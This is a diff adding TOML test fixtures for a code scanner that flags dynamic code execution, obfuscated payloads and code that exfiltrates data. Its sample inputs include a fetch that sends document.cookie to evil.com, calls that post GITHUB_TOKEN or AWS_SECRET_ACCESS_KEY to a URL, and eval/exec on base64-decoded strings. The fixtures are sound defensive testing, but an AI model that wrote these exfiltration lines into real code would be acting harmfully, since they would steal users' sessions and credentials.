@@ -1,0 +1,174 @@
+# Code file scan fixtures
+
+# ---------------------------------------------------------------------------
+# DynamicCodeExecution fixtures
+# ---------------------------------------------------------------------------
+
+[[fixture]]
+name = "eval_atob_proximity"
+min_milestone = 1
+input = "var x = eval(atob('SGVsbG8gV29ybGQ='));"
+context = "file"
+file_path = "test.js"
+expected_action = "warn"
+expected_rules = ["dynamic_code_execution"]
+
+[[fixture]]
+name = "exec_b64decode_proximity"
+min_milestone = 1
+input = "exec(b64decode('SGVsbG8gV29ybGQ='))"
+context = "file"
+file_path = "test.py"
+expected_action = "warn"
+expected_rules = ["dynamic_code_execution"]
+
+[[fixture]]
+name = "new_function_fromcharcode"
+min_milestone = 1
+input = "new Function(String.fromCharCode(72,101,108,108,111))()"
+context = "file"
+file_path = "test.js"
+expected_action = "warn"
+expected_rules = ["dynamic_code_execution"]
+
+[[fixture]]
+name = "bare_eval_no_fire"
+min_milestone = 1
+input = "var result = eval(userExpression);"
+context = "file"
+file_path = "test.js"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "eval_atob_distant_no_fire"
+min_milestone = 1
+input = """eval(something);
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+atob('SGVsbG8=');"""
+context = "file"
+file_path = "test.js"
+expected_action = "allow"
+expected_rules = []
+
+# ---------------------------------------------------------------------------
+# ObfuscatedPayload fixtures
+# ---------------------------------------------------------------------------
+
+[[fixture]]
+name = "atob_eval_long_base64"
+min_milestone = 1
+input = "eval(atob('QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ=='))"
+context = "file"
+file_path = "test.js"
+expected_action = "warn"
+expected_rules = ["obfuscated_payload"]
+
+[[fixture]]
+name = "b64decode_exec_long"
+min_milestone = 1
+input = "exec(b64decode(b'QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ=='))"
+context = "file"
+file_path = "test.py"
+expected_action = "warn"
+expected_rules = ["obfuscated_payload"]
+
+# ---------------------------------------------------------------------------
+# SuspiciousCodeExfiltration fixtures
+# ---------------------------------------------------------------------------
+
+[[fixture]]
+name = "fetch_query_concat_cookie"
+min_milestone = 1
+input = 'fetch("https://evil.com/collect?data=" + document.cookie)'
+context = "file"
+file_path = "test.js"
+expected_action = "warn"
+expected_rules = ["suspicious_code_exfiltration"]
+
+[[fixture]]
+name = "fetch_body_secret"
+min_milestone = 1
+input = 'fetch(url, {body: JSON.stringify({key: process.env.GITHUB_TOKEN})})'
+context = "file"
+file_path = "test.js"
+expected_action = "warn"
+expected_rules = ["suspicious_code_exfiltration"]
+
+[[fixture]]
+name = "requests_post_secret_data"
+min_milestone = 1
+input = 'requests.post(url, data=os.environ["AWS_SECRET_ACCESS_KEY"])'
+context = "file"
+file_path = "test.py"
+expected_action = "warn"
+expected_rules = ["suspicious_code_exfiltration"]
+
+[[fixture]]
+name = "normal_fetch_no_fire"
+min_milestone = 1
+input = 'fetch("/api/data").then(r => r.json())'
+context = "file"
+file_path = "test.js"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "fetch_bare_env_no_fire"
+min_milestone = 1
+input = """// line 1: fetch("/api/users")
+// lots of code...
+var env = process.env.NODE_ENV;"""
+context = "file"
+file_path = "test.js"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "normal_python_no_fire"
+min_milestone = 1
+input = """import os
+path = os.path.exists("/tmp/data")
+print(path)"""
+context = "file"
+file_path = "test.py"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "not_code_file_no_fire"
+min_milestone = 1
+input = "eval(atob('SGVsbG8gV29ybGQ='));"
+context = "file"
+file_path = "notes.txt"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "auth_client_no_fire"
+min_milestone = 1
+input = 'fetch("/api/login", {headers: {"Authorization": "Bearer " + process.env.GITHUB_TOKEN}})'
+context = "file"
+file_path = "test.js"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "shebang_python_no_ext"
+min_milestone = 1
+input = """#!/usr/bin/env python3
+import base64
+exec(b64decode('SGVsbG8gV29ybGQ='))"""
+context = "file"
+file_path = "script"
+expected_action = "warn"
+expected_rules = ["dynamic_code_execution"]
+
+[[fixture]]
+name = "internal_post_no_fire"
+min_milestone = 1
+input = 'requests.post("https://internal-api.example.com/log", json={"event": "login", "user": username})'
+context = "file"
+file_path = "test.py"
+expected_action = "allow"
+expected_rules = []
